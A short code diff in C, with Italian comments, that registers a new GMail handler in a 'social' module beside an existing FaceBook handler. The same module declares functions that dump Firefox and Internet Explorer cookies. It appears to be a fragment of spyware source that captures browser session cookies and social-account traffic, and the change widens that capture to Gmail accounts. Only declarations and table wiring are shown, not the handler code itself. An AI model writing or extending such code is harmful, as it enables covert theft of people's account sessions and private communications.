@@ -14,6 +14,7 @@
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
+extern DWORD HandleGMail(char *); // Handler per GMail
 extern DWORD HandleFaceBook(char *); // Handler per FaceBook
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(void); // Cookie per IExplorer
@@ -116,6 +117,8 @@ void InitSocialEntries()
 	}
 	wcscpy_s(social_entry[0].domain, FACEBOOK_DOMAIN);
 	social_entry[0].RequestHandler = HandleFaceBook;
+	wcscpy_s(social_entry[1].domain, GMAIL_DOMAIN);
+	social_entry[1].RequestHandler = HandleGMail;
 }
 
 void SocialMainLoop()
